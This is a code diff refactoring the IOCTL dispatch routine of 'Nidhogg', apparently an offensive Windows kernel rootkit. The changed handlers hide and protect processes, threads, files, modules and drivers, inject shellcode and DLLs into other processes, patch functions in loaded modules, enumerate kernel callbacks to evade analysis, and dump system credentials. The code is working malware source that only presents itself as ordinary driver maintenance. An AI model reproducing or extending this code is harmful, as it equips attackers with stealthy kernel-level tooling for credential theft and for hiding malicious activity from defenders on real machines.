@@ -13,11 +13,15 @@
 * Returns:
 * @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
 */
+_Function_class_(DRIVER_DISPATCH)
+_IRQL_requires_max_(DISPATCH_LEVEL)
+_IRQL_requires_same_
 NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
 	UNREFERENCED_PARAMETER(DeviceObject);
 
 	NTSTATUS status = STATUS_SUCCESS;
 	SIZE_T len = 0;
+	IrqlGuard guard(PASSIVE_LEVEL);
 	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
 
 	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
@@ -41,21 +45,21 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			if (!NidhoggProcessHandler->RemoveProcess(data->Pid, ProcessType::Protected)) {
-				Print(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
-				status = STATUS_NOT_FOUND;
-				break;
-			}
-			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
-		}
-		else {
+		if (data->Protect) {
 			if (!NidhoggProcessHandler->ProtectProcess(data->Pid)) {
 				Print(DRIVER_PREFIX "Failed to protect process with pid %d.\n", data->Pid);
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 			Print(DRIVER_PREFIX "Protected process with pid %d.\n", data->Pid);
+		}
+		else {
+			if (!NidhoggProcessHandler->RemoveProcess(data->Pid, ProcessType::Protected)) {
+				Print(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
+				status = STATUS_NOT_FOUND;
+				break;
+			}
+			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
 		}
 
 		len += size;
@@ -108,16 +112,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			status = NidhoggProcessHandler->UnhideProcess(data->Pid);
-
-			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
-				break;
-			}
-			Print(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
-		}
-		else {
+		if (data->Protect) {
 			status = NidhoggProcessHandler->HideProcess(data->Pid);
 
 			if (!NT_SUCCESS(status)) {
@@ -125,6 +120,15 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 			Print(DRIVER_PREFIX "Hid process with pid %d.\n", data->Pid);
+		}
+		else {
+			status = NidhoggProcessHandler->UnhideProcess(data->Pid);
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
+				break;
+			}
+			Print(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
 		}
 
 		len += size;
@@ -242,18 +246,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
-				STATUS_SUCCESS : STATUS_NOT_FOUND;
-			
-			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
-				break;
-			}
-			Print(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
-			break;
-		}
-		else {
+		if (data->Protect) {
 			status = NidhoggThreadHandler->ProtectThread(data->Tid) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 
 			if (!NT_SUCCESS(status)) {
@@ -261,6 +254,16 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 			Print(DRIVER_PREFIX "Protecting thread with tid %d\n", data->Tid);
+		}
+		else {
+			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
+				STATUS_SUCCESS : STATUS_NOT_FOUND;
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
+				break;
+			}
+			Print(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
 		}
 
 		len += size;
@@ -282,16 +285,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		if (data->Remove) {
-			status = NidhoggThreadHandler->UnhideThread(data->Tid);
-
-			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
-				break;
-			}
-			Print(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
-		}
-		else {
+		if (data->Protect) {
 			status = NidhoggThreadHandler->HideThread(data->Tid);
 
 			if (!NT_SUCCESS(status)) {
@@ -299,6 +293,15 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 				break;
 			}
 			Print(DRIVER_PREFIX "Hiding thread with tid %d\n", data->Tid);
+		}
+		else {
+			status = NidhoggThreadHandler->UnhideThread(data->Tid);
+
+			if (!NT_SUCCESS(status)) {
+				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
+				break;
+			}
+			Print(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
 		}
 
 		len += size;
@@ -377,8 +380,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_PROTECT_UNPROTECT_FILE:
 	{
-		wchar_t* filePath = nullptr;
-
 		if (!Features.FileProtection) {
 			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
 			status = STATUS_UNSUCCESSFUL;
@@ -400,40 +401,26 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 
-		MemoryAllocator<WCHAR*> allocator(&filePath, MAX_PATH * sizeof(WCHAR));
-		status = allocator.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));
+		MemoryAllocator<WCHAR*> filePath(MAX_PATH * sizeof(WCHAR));
+		status = filePath.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));
 
 		if (!NT_SUCCESS(status))
 			break;
 
-		if (!filePath) {
-			Print(DRIVER_PREFIX "Buffer data is invalid.\n");
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
-
 		if (data->Protect) {
-			if (!NidhoggFileHandler->ProtectFile(filePath)) {
+			if (!NidhoggFileHandler->ProtectFile(filePath.Get())) {
 				Print(DRIVER_PREFIX "Failed to add file.\n");
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
-
-			auto prevIrql = KeGetCurrentIrql();
-			KeLowerIrql(PASSIVE_LEVEL);
-			Print(DRIVER_PREFIX "Protected file %ws.\n", filePath);
-			KeRaiseIrql(prevIrql, &prevIrql);
+			Print(DRIVER_PREFIX "Protected file %ws.\n", filePath.Get());
 		}
 		else {
-			if (!NidhoggFileHandler->RemoveFile(filePath, FileType::Protected)) {
+			if (!NidhoggFileHandler->RemoveFile(filePath.Get(), FileType::Protected)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
-
-			auto prevIrql = KeGetCurrentIrql();
-			KeLowerIrql(PASSIVE_LEVEL);
-			Print(DRIVER_PREFIX "Unprotected file %ws.\n", filePath);
-			KeRaiseIrql(prevIrql, &prevIrql);
+			Print(DRIVER_PREFIX "Unprotected file %ws.\n", filePath.Get());
 		}
 
 		len += size;
@@ -698,24 +685,27 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		patchedModule.PatchLength = data->PatchLength;
 		SIZE_T strSize = strlen(data->FunctionName);
 
-		MemoryAllocator<CHAR*> functionNameAllocator(&patchedModule.FunctionName, strSize);
-		status = functionNameAllocator.CopyData(data->FunctionName, strSize);
+		MemoryAllocator<CHAR*> functionName(strSize);
+		status = functionName.CopyData(data->FunctionName, strSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		patchedModule.FunctionName = functionName.Get();
 
 		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
-		MemoryAllocator<WCHAR*> moduleNameAllocator(&patchedModule.ModuleName, strSize);
-		status = moduleNameAllocator.CopyData(data->ModuleName, strSize);
+		MemoryAllocator<WCHAR*> moduleName(strSize);
+		status = moduleName.CopyData(data->ModuleName, strSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		patchedModule.ModuleName = moduleName.Get();
 
-		MemoryAllocator<PVOID> patchAllocator(&patchedModule.Patch, data->PatchLength);
-		status = patchAllocator.CopyData(data->Patch, data->PatchLength);
+		MemoryAllocator<PVOID> patch(data->PatchLength);
+		status = patch.CopyData(data->Patch, data->PatchLength);
 
 		if (!NT_SUCCESS(status))
 			break;
+		patchedModule.Patch = patch.Get();
 
 		if (!IsValidPid(data->Pid)) {
 			Print(DRIVER_PREFIX "Invalid PID.\n");
@@ -725,18 +715,11 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = NidhoggMemoryHandler->PatchModule(patchedModule);
 
 		if (!NT_SUCCESS(status)) {
-			auto prevIrql = KeGetCurrentIrql();
-			KeLowerIrql(PASSIVE_LEVEL);
 			Print(DRIVER_PREFIX "Failed to patch module %ws and function %s for process %d: (0x%08X).\n", 
 				patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid, status);
-			KeRaiseIrql(prevIrql, &prevIrql);
 			break;
 		}
-		auto prevIrql = KeGetCurrentIrql();
-		KeLowerIrql(PASSIVE_LEVEL);
 		Print(DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid);
-		KeRaiseIrql(prevIrql, &prevIrql);
-
 		len += size;
 		break;
 	}
@@ -758,14 +741,16 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 		auto data = static_cast<IoctlHiddenModuleInfo*>(Irp->AssociatedIrp.SystemBuffer);
+		hiddenModule.Hide = data->Hide;
 		hiddenModule.Pid = data->Pid;
-		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
+		SIZE_T moduleNameSize = (wcslen(data->ModuleName) + 1) * sizeof(WCHAR);
 
-		MemoryAllocator<WCHAR*> moduleNameAllocator(&hiddenModule.ModuleName, moduleNameSize);
-		status = moduleNameAllocator.CopyData(data->ModuleName, moduleNameSize);
+		MemoryAllocator<WCHAR*> moduleName(moduleNameSize);
+		status = moduleName.CopyData(data->ModuleName, moduleNameSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		hiddenModule.ModuleName = moduleName.Get();
 
 		if (!IsValidPid(hiddenModule.Pid)) {
 			Print(DRIVER_PREFIX "Buffer is invalid.\n");
@@ -775,9 +760,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		status = hiddenModule.Hide ? NidhoggMemoryHandler->HideModule(hiddenModule) : 
 			NidhoggMemoryHandler->RestoreModule(hiddenModule);
 
-		auto prevIrql = KeGetCurrentIrql();
-		KeLowerIrql(PASSIVE_LEVEL);
-
 		if (!NT_SUCCESS(status)) {
 			if (hiddenModule.Hide)
 				Print(DRIVER_PREFIX "Failed to hide module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName, 
@@ -785,14 +767,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			else
 				Print(DRIVER_PREFIX "Failed to restore module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName, 
 					hiddenModule.Pid, status);
-			KeRaiseIrql(prevIrql, &prevIrql);
 			break;
 		}
 		if (hiddenModule.Hide)
 			Print(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
 		else
 			Print(DRIVER_PREFIX "Restored module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
-		KeRaiseIrql(prevIrql, &prevIrql);
 
 		len += size;
 		break;
@@ -800,7 +780,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 
 	case IOCTL_HIDE_UNHIDE_DRIVER:
 	{
-		wchar_t* driverName = nullptr;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
 		if (size != sizeof(IoctlHiddenDriverInfo)) {
@@ -811,8 +790,8 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		auto data = static_cast<IoctlHiddenDriverInfo*>(Irp->AssociatedIrp.SystemBuffer);
 		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);
 
-		MemoryAllocator<WCHAR*> driverNameAllocator(&driverName, driverNameSize);
-		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);
+		MemoryAllocator<WCHAR*> driverName(driverNameSize);
+		status = driverName.CopyData(data->DriverName, driverNameSize);
 
 		if (!NT_SUCCESS(status)) {
 			Print(DRIVER_PREFIX "Buffer is invalid.\n");
@@ -820,42 +799,22 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		if (data->Hide) {
-			status = NidhoggMemoryHandler->HideDriver(driverName);
-			auto prevIrql = KeGetCurrentIrql();
-
-			if (prevIrql != PASSIVE_LEVEL)
-				KeLowerIrql(PASSIVE_LEVEL);
+			status = NidhoggMemoryHandler->HideDriver(driverName.Get());
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName, status);
-
-				if (prevIrql != PASSIVE_LEVEL)
-					KeRaiseIrql(prevIrql, &prevIrql);
+				Print(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName.Get(), status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName);
-
-			if (prevIrql != PASSIVE_LEVEL)
-				KeRaiseIrql(prevIrql, &prevIrql);
+			Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName.Get());
 		}
 		else {
-			status = NidhoggMemoryHandler->UnhideDriver(driverName);
-			auto prevIrql = KeGetCurrentIrql();
-
-			if (prevIrql != PASSIVE_LEVEL)
-				KeLowerIrql(PASSIVE_LEVEL);
+			status = NidhoggMemoryHandler->UnhideDriver(driverName.Get());
 
 			if (!NT_SUCCESS(status)) {
-				Print(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName, status);
-
-				if (prevIrql != PASSIVE_LEVEL)
-					KeRaiseIrql(prevIrql, &prevIrql);
+				Print(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName.Get(), status);
 				break;
 			}
-			Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName);
-
-			if (prevIrql != PASSIVE_LEVEL)
-				KeRaiseIrql(prevIrql, &prevIrql);
+			Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName.Get());
 		}
 
 		len += size;
@@ -888,35 +847,39 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		shellcodeInfo.Parameter3 = NULL;
 		shellcodeInfo.Parameter3Size = data->Parameter3Size;
 
-		MemoryAllocator<PVOID> shellcodeAllocator(&shellcodeInfo.Shellcode, shellcodeInfo.ShellcodeSize);
-		status = shellcodeAllocator.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);
+		MemoryAllocator<PVOID> shellcode(shellcodeInfo.ShellcodeSize);
+		status = shellcode.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		shellcodeInfo.Shellcode = shellcode.Get();
 
 		// Copy parameters
 		if (shellcodeInfo.Parameter1Size > 0) {
-			MemoryAllocator<PVOID> parameter1Alloc(&shellcodeInfo.Parameter1, shellcodeInfo.Parameter1Size);
-			status = parameter1Alloc.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
+			MemoryAllocator<PVOID> parameter1(shellcodeInfo.Parameter1Size);
+			status = parameter1.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);
 
 			if (!NT_SUCCESS(status))
 				break;
+			shellcodeInfo.Parameter1 = parameter1.Get();
 		}
 
 		if (shellcodeInfo.Parameter2Size > 0) {
-			MemoryAllocator<PVOID> parameter2Alloc(&shellcodeInfo.Parameter2, shellcodeInfo.Parameter2Size);
-			status = parameter2Alloc.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
+			MemoryAllocator<PVOID> parameter2(shellcodeInfo.Parameter2Size);
+			status = parameter2.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);
 
 			if (!NT_SUCCESS(status))
 				break;
+			shellcodeInfo.Parameter2 = parameter2.Get();
 		}
 
 		if (shellcodeInfo.Parameter3Size > 0) {
-			MemoryAllocator<PVOID> parameter3Alloc(&shellcodeInfo.Parameter3, shellcodeInfo.Parameter3Size);
-			status = parameter3Alloc.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
+			MemoryAllocator<PVOID> parameter3(shellcodeInfo.Parameter3Size);
+			status = parameter3.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);
 
 			if (!NT_SUCCESS(status))
 				break;
+			shellcodeInfo.Parameter3 = parameter3.Get();
 		}
 
 		switch (shellcodeInfo.Type) {
@@ -930,13 +893,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggMemoryHandler->InjectShellcodeAPC(shellcodeInfo);
 			break;
 		}
-		case InjectionType::NtCreateThreadExInjection: {
-			if (!Features.CreateThreadInjection) {
-				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx shellcode injection feature is unavaliable.\n");
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-
+		case InjectionType::CreateThreadInjection: {
 			status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
 			break;
 		}
@@ -996,13 +953,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			status = NidhoggMemoryHandler->InjectDllAPC(dllInfo);
 			break;
 		}
-		case InjectionType::NtCreateThreadExInjection: {
-			if (!Features.CreateThreadInjection) {
-				Print(DRIVER_PREFIX "Due to previous error, NtCreateThreadEx dll injection feature is unavaliable.\n");
-				status = STATUS_UNSUCCESSFUL;
-				break;
-			}
-
+		case InjectionType::CreateThreadInjection: {
 			status = NidhoggMemoryHandler->InjectDllThread(dllInfo);
 			break;
 		}
@@ -1065,11 +1016,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 		auto data = static_cast<IoctlCallbackList<PsRoutine>*>(Irp->AssociatedIrp.SystemBuffer);
 
-		if (!data->Callbacks) {
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
-
 		switch (data->Type) {
 		case PsImageLoadType:
 		case PsCreateProcessTypeEx:
@@ -1100,11 +1046,6 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 			break;
 		}
 		auto data = static_cast<IoctlCallbackList<CmCallback>*>(Irp->AssociatedIrp.SystemBuffer);
-
-		if (!data->Callbacks) {
-			status = STATUS_INVALID_PARAMETER;
-			break;
-		}
 		status = NidhoggAntiAnalysisHandler->ListRegistryCallbacks(data);
 
 		if (!NT_SUCCESS(status)) {
@@ -1210,21 +1151,26 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 	{
 		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;
 
-		if (size == sizeof(SIZE_T)) {
-			SIZE_T sizeToAlloc = 0;
-			auto data = static_cast<SIZE_T*>(Irp->AssociatedIrp.SystemBuffer);
-			status = NidhoggMemoryHandler->DumpCredentials(&sizeToAlloc);
-
-			if (NT_SUCCESS(status)) {
-				status = ProbeAddress(data, sizeof(SIZE_T), sizeof(SIZE_T));
-
-				if (NT_SUCCESS(status))
-					*data = sizeToAlloc;
-				Print(DRIVER_PREFIX "Need %llu bytes to dump credentials.\n", sizeToAlloc);
-			}
+		if (size == sizeof(IoctlCredentialsInfoSize)) {
+			auto data = static_cast<IoctlCredentialsInfoSize*>(Irp->AssociatedIrp.SystemBuffer);
+			status = NidhoggMemoryHandler->DumpCredentials(data);
 		}
-		else if (size == sizeof(IoctlCredentials)) {
-			auto data = static_cast<IoctlCredentials*>(Irp->AssociatedIrp.SystemBuffer);
+		else if (size == sizeof(IoctlCredentialsSize)) {
+			auto data = static_cast<PVOID*>(Irp->AssociatedIrp.SystemBuffer);
+
+			if (!data) {
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+			PVOID credentialsSizeAddress = *data;
+			IoctlCredentialsSize* credentialsSize = static_cast<IoctlCredentialsSize*>(credentialsSizeAddress);
+			status = NidhoggMemoryHandler->GetCredentialsSize(credentialsSize);
+
+			if (NT_SUCCESS(status))
+				Print(DRIVER_PREFIX "Dumped credentials size successfully.\n");
+		}
+		else if (size == sizeof(IoctlCredentialsInformation)) {
+			auto data = static_cast<IoctlCredentialsInformation*>(Irp->AssociatedIrp.SystemBuffer);
 			status = NidhoggMemoryHandler->GetCredentials(data);
 
 			if (NT_SUCCESS(status))
@@ -1334,11 +1280,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		}
 
 		scriptInfo.ScriptSize = data->ScriptSize;
-		MemoryAllocator<PVOID> scriptAllocator(&scriptInfo.Script, scriptInfo.ScriptSize);
-		status = scriptAllocator.CopyData(data->Script, scriptInfo.ScriptSize);
+		MemoryAllocator<PVOID> script(scriptInfo.ScriptSize);
+		status = script.CopyData(data->Script, scriptInfo.ScriptSize);
 
 		if (!NT_SUCCESS(status))
 			break;
+		scriptInfo.Script = script.Get();
 
 		__try {
 			scriptManager = new ScriptManager();
@@ -1364,6 +1311,12 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 		break;
 	}
 
+	// IrqlGuard will restore the original IRQL on exit, but ensuring that the IRQL is PASSIVE_LEVEL before calling to IoCompleteRequest.
+	if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
+		guard.SetExitIrql(guard.GetOriginalIrql());
+		guard.SetIrql(PASSIVE_LEVEL, true);
+	}
+
 	Irp->IoStatus.Status = status;
 	Irp->IoStatus.Information = len;
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
@@ -1382,6 +1335,7 @@ NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP 
 * Returns:
 * @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
 */
+_Function_class_(DRIVER_DISPATCH)
 _IRQL_requires_max_(DISPATCH_LEVEL)
 _IRQL_requires_same_
 NTSTATUS NidhoggCreateClose(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
